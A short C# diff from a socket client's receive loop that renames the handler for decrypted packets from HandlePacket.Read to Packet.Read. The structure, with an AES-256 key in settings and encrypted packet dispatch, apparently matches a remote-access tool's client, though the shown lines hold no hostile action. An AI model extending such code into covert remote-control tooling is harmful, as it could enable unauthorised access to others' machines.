@@ -120,7 +120,7 @@ namespace Client.Sockets
                         MS.Write(Buffer, 0, recevied);
                         if (MS.Length == Buffersize)
                         {
-                            ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
+                            ThreadPool.QueueUserWorkItem(Packet.Read, Settings.aes256.Decrypt(MS.ToArray()));
                             Buffer = new byte[4];
                             MS.Dispose();
                             MS = new MemoryStream();
